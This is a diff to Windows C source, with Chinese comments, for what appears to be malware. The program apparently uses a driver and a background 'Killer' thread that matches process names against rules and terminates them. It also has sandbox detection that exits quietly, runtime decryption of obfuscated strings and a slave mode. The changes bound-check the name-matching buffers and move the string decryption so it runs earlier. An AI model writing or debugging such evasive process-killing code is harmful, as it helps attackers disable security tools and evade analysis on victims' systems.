@@ -183,7 +183,7 @@ static void CleanupDriver(void) {
     if (g_hKillerStop) {
         SetEvent(g_hKillerStop);
         if (g_hKillerThread) {
-            WaitForSingleObject(g_hKillerThread, 2000);
+            WaitForSingleObject(g_hKillerThread, 5000);
             CloseHandle(g_hKillerThread);
             g_hKillerThread = NULL;
         }
@@ -819,8 +819,13 @@ static DWORD WINAPI BackgroundKillerThread(LPVOID param) {
 
                     /* 模糊匹配: 大小写不敏感的 strstr */
                     char lower1[MAX_PATH], lower2[MAX_PATH];
-                    for (int i = 0; token[i]; i++) lower1[i] = (char)tolower((unsigned char)token[i]);
-                    for (int i = 0; exeNameA[i]; i++) lower2[i] = (char)tolower((unsigned char)exeNameA[i]);
+                    int j;
+                    for (j = 0; token[j] && j < MAX_PATH-1; j++)
+                        lower1[j] = (char)tolower((unsigned char)token[j]);
+                    lower1[j] = '\0';
+                    for (j = 0; exeNameA[j] && j < MAX_PATH-1; j++)
+                        lower2[j] = (char)tolower((unsigned char)exeNameA[j]);
+                    lower2[j] = '\0';
 
                     if (strstr(lower2, lower1) || strstr(lower1, lower2)) {
                         printf("[Killer] 匹配: %ls (PID=%lu)  ← 规则: %s\n",
@@ -1893,6 +1898,9 @@ int main(int argc, char *argv[]) {
     }
 
     // ===== 第三步：Slave/Uninstall 立即执行后退出 =====
+    /* 确保所有混淆字符串已解密 */
+    DecryptAllStrings();
+
     if (bIsSlave) {
         SlaveRun();
         return 0;
@@ -1907,9 +1915,6 @@ int main(int argc, char *argv[]) {
         printf("[Guard] 沙箱环境检测触发，程序退出\n");
         return 0;
     }
-
-    /* ★ 解密所有混淆字符串 */
-    DecryptAllStrings();
 
 
     // ===== 第四步：只有“应用程序模式”或“服务模式”才会走到这里 =====
